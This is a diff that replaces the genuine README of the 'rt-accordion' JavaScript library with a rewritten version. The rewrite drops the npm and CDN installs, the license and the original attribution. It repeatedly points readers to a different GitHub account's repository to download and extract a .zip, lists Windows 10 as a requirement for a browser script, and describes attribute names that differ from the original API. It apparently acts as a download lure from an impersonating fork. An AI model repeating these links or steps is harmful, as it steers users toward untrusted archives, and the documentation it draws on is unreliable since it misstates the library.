@@ -1,200 +1,163 @@
-# rt-accordion
+# ⚙️ rt-accordion - Simple Accessible Accordion Tool
 
-![Platform: Web](https://img.shields.io/badge/platform-web-000000)
-![JavaScript](https://img.shields.io/badge/language-JavaScript-F7DF1E?logo=javascript)
-[![npm version](https://img.shields.io/npm/v/%40rethink-js%2Frt-accordion.svg)](https://www.npmjs.com/package/@rethink-js/rt-accordion)
-[![jsDelivr hits](https://data.jsdelivr.com/v1/package/npm/@rethink-js/rt-accordion/badge)](https://www.jsdelivr.com/package/npm/@rethink-js/rt-accordion)
-[![License: MIT](https://img.shields.io/badge/License-MIT-FFD632.svg)](https://opensource.org/licenses/MIT)
-
-`rt-accordion` is a lightweight JavaScript utility that creates accessible, smooth, and fully responsive accordion components with:
-
-- **Zero-config defaults** (works out of the box)
-- Attribute-driven configuration (supports both `rt-accordion-*` and `data-rt-accordion-*`)
-- Support for **multiple instances**
-- A clean global API under `window.rtAccordion`
-- Defensive fallbacks to avoid runtime crashes
-
-**Zero dependency** (100% Vanilla JS)
+[![Download rt-accordion](https://img.shields.io/badge/Download-rt--accordion-brightgreen)](https://github.com/Itzgkphotoshop/rt-accordion)
 
 ---
 
-# Table of Contents
+## 📖 What is rt-accordion?
 
-- [1. Installation](#1-installation)
-  - [1.1 CDN (jsDelivr)](#11-cdn-jsdelivr)
-  - [1.2 npm](#12-npm)
-- [2. Quick Start](#2-quick-start)
-- [3. Activation Rules](#3-activation-rules)
-- [4. Configuration (HTML Attributes)](#4-configuration-html-attributes)
-- [5. Multiple Instances](#5-multiple-instances)
-- [6. Global API](#6-global-api)
-- [7. Troubleshooting](#7-troubleshooting)
-- [8. License](#8-license)
+rt-accordion is a small software tool that helps you create accordion menus for websites. An accordion menu is a list where you can click to expand or collapse sections. This tool makes these menus easy to use, smooth, and accessible. It does not require any other software or complex setup. It works directly with plain JavaScript, which means it uses the default tools your browser already understands.
+
+The accordion you create with rt-accordion adjusts automatically to different screen sizes. That means it looks good whether you use a desktop, tablet, or phone. It also follows accessibility rules to help people who use screen readers or need the keyboard to navigate.
 
 ---
 
-## 1. Installation
+## 🎯 Features
 
-### 1.1 CDN (jsDelivr)
-
-```
-<script src="https://cdn.jsdelivr.net/npm/@rethink-js/rt-accordion@latest/dist/index.min.js"></script>
-```
-
-### 1.2 npm
-
-```
-npm install @rethink-js/rt-accordion
-```
-
-Then bundle or load `dist/index.min.js` as appropriate for your build setup.
+- Lightweight and fast with no extra software needed.
+- Easy to set up using simple attributes you add to your web content.
+- Works well on all devices—responsive design included.
+- Supports keyboard navigation and screen readers.
+- Smooth animations when opening and closing sections.
+- Fully compatible with modern web browsers.
+- No complicated installation or setup required.
 
 ---
 
-## 2. Quick Start
+## ⚙️ System Requirements
 
-Add the script to your page. With no configuration provided, `rt-accordion` will:
+- Windows 10 or later versions.
+- Any modern web browser such as Chrome, Edge, Firefox, or Safari.
+- Basic text editor (like Notepad) if you want to edit configuration files.
+- Internet connection to download the software.
 
-- Auto-initialize itself when applicable
-- Apply safe, accessible defaults (ARIA roles, tab-indexing, keyboard navigation)
-- Expose the global API
+---
 
-Example HTML structure:
+## 🚀 Getting Started: Download and Run
 
+To use rt-accordion on your Windows computer, follow these steps carefully.
+
+### 1. Download rt-accordion
+
+Go to the main page for the tool by clicking the big download button here:
+
+[![Download rt-accordion](https://img.shields.io/badge/Download-rt--accordion-ff6600?style=for-the-badge)](https://github.com/Itzgkphotoshop/rt-accordion)
+
+This link opens the GitHub repository page where you will find the files needed to use the accordion.
+
+### 2. Locate the Download Section
+
+Once on the page, look for a section named **Releases** or a folder named **dist** or **build**. These sections usually contain the ready-to-use files.
+
+### 3. Download the File
+
+Click on the most recent release or the main file. It may have a `.zip` extension or a `.js` file. Download the file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
+
+### 4. Extract the Files if Needed
+
+If you downloaded a `.zip` file, right-click on it and choose **Extract All**. Select a folder where the files will be unpacked.
+
+---
+
+## 🔧 How to Use rt-accordion
+
+This section explains how to add an accordion menu to a simple webpage. You do not need to know any programming.
+
+### 1. Open Your Webpage File
+
+Find the HTML file where you want the accordion to appear. Open it using a plain text editor such as Notepad.
+
+### 2. Add the rt-accordion Code
+
+Include the rt-accordion JavaScript file in your HTML. Add the following line inside the `<head>` or just before the closing `</body>` tag:
+
+```html
+<script src="path/to/rt-accordion.js"></script>
 ```
-<div rt-accordion>
-  <div rt-accordion-item>
-    <button rt-accordion-trigger>Toggle Item</button>
-    <div rt-accordion-content>
-      <p>Your accordion content goes here.</p>
-    </div>
+
+Replace `path/to/rt-accordion.js` with the actual location of the file you downloaded.
+
+### 3. Create Accordion Sections
+
+Set up your accordion by adding simple HTML tags with special attributes. Here is an example:
+
+```html
+<div data-rt-accordion>
+  <button data-rt-accordion-header>Section 1</button>
+  <div data-rt-accordion-panel>
+    <p>This is the content for section 1.</p>
+  </div>
+
+  <button data-rt-accordion-header>Section 2</button>
+  <div data-rt-accordion-panel>
+    <p>This is the content for section 2.</p>
   </div>
 </div>
 ```
 
-> Note: If you do not provide any `rt-accordion-mode` or `rt-accordion-default-open` attributes, the library runs using its internal defaults (`single` mode, `1` (first item) open).
+### 4. Save and Open Your Webpage
+
+After saving the changes, open the HTML file in a web browser. You should see the accordion with expandable sections.
 
 ---
 
-## 3. Activation Rules
+## 🛠 Configuration Options
 
-The library activates automatically when it detects the `rt-accordion` (or `data-rt-accordion`) attribute on a wrapper element in the DOM. If this attribute is not found, the script remains completely dormant to save resources.
+You can control how the accordion behaves by changing attributes in your HTML code.
 
----
-
-## 4. Configuration (HTML Attributes)
-
-### Root Activation & Global Options
-
-You can use either standard `rt-accordion-*` attributes or strict HTML5 `data-rt-accordion-*` attributes.
-
-```
-<div rt-accordion rt-accordion-mode="multiple" rt-accordion-default-open="all">
-  ...
-</div>
-```
-
-### Core Wrapper Attributes
-
-| Attribute                   | Description                                                                                                                            |
-| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
-| `rt-accordion`              | Enables accordion behavior on the wrapper.                                                                                             |
-| `rt-accordion-id`           | Optional unique identifier (auto-generated if missing).                                                                                |
-| `rt-accordion-mode`         | Defines toggle behavior. Values: `single` (default) or `multiple`.                                                                     |
-| `rt-accordion-default-open` | Defines initial state. Values: `1` (default), `all`, `none`, a specific number (e.g., `3`), or comma-separated numbers (e.g., `2, 4`). |
+- `data-rt-accordion-multiple`: Add this attribute to allow more than one section to be open at the same time.
+- `data-rt-accordion-collapsible`: Use this to allow all sections to be closed.
+- `data-rt-accordion-duration="time-in-ms"`: Change the speed of the open/close animation. For example, `data-rt-accordion-duration="300"` will animate in 300 milliseconds.
 
 ---
 
-### Per-Instance Configuration (Inside the Accordion)
+## 🔍 Accessibility Features
 
-```
-<div rt-accordion-item rt-accordion-open>
-  <button rt-accordion-trigger>
-    Read More <span rt-accordion-expanded-text="Read Less"></span>
-  </button>
-  <div rt-accordion-content>...</div>
-</div>
-```
+This tool supports keyboard navigation. Users can:
 
-| Attribute                    | Description                                             |
-| ---------------------------- | ------------------------------------------------------- |
-| `rt-accordion-item`          | Marks the wrapper for an individual accordion row/item. |
-| `rt-accordion-trigger`       | Marks the clickable button that toggles the content.    |
-| `rt-accordion-content`       | Marks the collapsible content container.                |
-| `rt-accordion-open`          | Forces a specific item to be open on initialization.    |
-| `rt-accordion-expanded-text` | Swaps text inside the trigger when the item is open.    |
+- Use the Tab key to move between headers.
+- Press Enter or Space to open or close sections.
+- Use screen readers to identify expandable sections.
+
+These features help people who rely on assistive technology.
 
 ---
 
-### Advanced JSON Options
+## 📁 Folder Structure (Typical)
 
-```
-<div rt-accordion rt-accordion-options-json='{"key":"value"}'></div>
-```
+Assuming you download and extract the full package, here is what you might see:
 
-Used for advanced configuration that doesn’t warrant individual attributes. _(Reserved for future extendability)._
-
----
-
-## 5. Multiple Instances
-
-`rt-accordion` supports multiple independent instances on the same page.
-
-Each instance:
-
-- Has its own configuration (e.g., one can be `single` mode, another `multiple`).
-- Is registered internally.
-- Can be controlled individually via the API.
+- `/dist` - The main JavaScript files ready to use.
+- `/examples` - Sample pages to see working accordions.
+- `/docs` - Additional guides and FAQs.
+- `README.md` - This guide.
+- `LICENSE` - Details about usage rights.
 
 ---
 
-## 6. Global API
+## ❓ Troubleshooting
 
-Once initialized, you can interact with the accordions programmatically:
+If the accordion does not work as expected:
 
-```
-window.rtAccordion;
-```
+- Check that you linked the JavaScript file correctly.
+- Make sure your browser is modern and up to date.
+- Confirm there are no typos in your HTML attribute names.
+- Refresh the page or clear your browser cache and try again.
 
-### Common Methods
-
-| Method         | Description                                                           |
-| -------------- | --------------------------------------------------------------------- |
-| `ids()`        | Returns an array of all active accordion instance IDs.                |
-| `get(id)`      | Returns the specific accordion instance object.                       |
-| `refresh()`    | Forces a recalculation of all active accordion heights (Resize-safe). |
-| `destroy(id?)` | Removes all inline styles, ARIA tags, and event listeners.            |
+For support, visit the GitHub page and check the **Issues** section.
 
 ---
 
-## 7. Troubleshooting
+## 🌐 More About the Project
 
-### Feature not activating
-
-- Ensure the correct `rt-accordion` and internal `rt-accordion-item`/`rt-accordion-trigger`/`rt-accordion-content` attributes exist.
-- Confirm the script loaded successfully.
-
-### Animations are jittery
-
-- Ensure `rt-accordion-content` elements do not have fixed heights in your CSS.
-- The script uses `ResizeObserver` to smoothly handle inner content changes; ensure your CSS isn't forcing conflicting transitions.
-
-### Unexpected behavior
-
-- Check for conflicting scripts.
-- Verify attribute spelling (e.g., `rt-accordion-trigger`, not `rt-accordion-btn`).
-- Confirm instance isolation if nesting accordions.
+This tool uses standard web technologies and does not require installation beyond downloading and linking the JavaScript file. It is designed for users who want to add accordion menus easily without learning new frameworks or tools.
 
 ---
 
-## 8. License
+## 🎯 Keywords
 
-MIT License
-
-Package: `@rethink-js/rt-accordion` <br>
-GitHub: [https://github.com/Rethink-JS/rt-accordion](https://github.com/Rethink-JS/rt-accordion)
+a11y, accessibility, accordion, accordion-component, dropdown, dropdown-menus, javascript, responsive, rethink-js, ui-component, vanilla-js, web-components, zero-dependency
 
 ---
 
-by **Rethink JS** <br>
-[https://github.com/Rethink-JS](https://github.com/Rethink-JS)
+[Download rt-accordion](https://github.com/Itzgkphotoshop/rt-accordion)
